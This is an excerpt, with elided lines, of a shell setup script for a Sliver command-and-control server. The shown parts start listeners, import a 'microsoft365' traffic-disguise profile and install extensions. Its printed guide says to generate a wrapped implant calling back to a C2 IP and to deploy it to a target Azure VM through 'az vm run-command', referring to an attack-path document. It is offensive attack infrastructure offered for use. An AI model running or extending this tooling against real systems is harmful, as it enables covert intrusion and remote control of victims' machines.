...
if [ ! -f "$ARMORY_MARKER" ]; then
    echo "[*] Installing armory extensions (first run)..."
...
[ -n "$DOMAIN" ] && LISTENER_CMDS="$LISTENER_CMDS
...
$LISTENER_CMDS
LISTENERS
    then LISTENER_OK=1; break; fi
    echo "[*] Listener attempt $attempt failed, retrying in 5s..."
    sleep 5
done
[ "$LISTENER_OK" = "0" ] && echo "[!] Start listener manually: $LISTENER_CMDS"
...
echo ""
echo -e "  ${YELLOW}1. Start everything (server + profile + armory + listeners):${NC}"
echo -e "     ./start.sh"
echo -e "     ./start.sh --domain cdn.yourdomain.com   ${CYAN}# add HTTPS listener${NC}"
echo -e "     ./start.sh --fresh                        ${CYAN}# restart clean${NC}"
echo ""
echo -e "  ${YELLOW}2. Generate Harriet-wrapped implant (in sliver console):${NC}"
...
echo -e "     ./gen-implant.sh --ip YOUR_C2_IP"
echo ""
echo -e "  ${YELLOW}3. Deploy to target (see ATTACKPATH.md for full guide):${NC}"
echo -e "     az vm run-command create --vm-name TARGET --resource-group RG ..."
echo ""
echo -e "  ${CYAN}start.sh handles automatically:${NC}"
echo -e "    - Server daemon (reuses existing, preserves beacons)"
echo -e "    - Operator config creation (--permissions all)"
echo -e "    - microsoft365 C2 profile import (first run)"
echo -e "    - Armory extensions install (first run)"
echo -e "    - mTLS listener on 0.0.0.0:8888"
echo ""
echo -e "  ${CYAN}Docs:${NC} README.md | ATTACKPATH.md"
echo ""
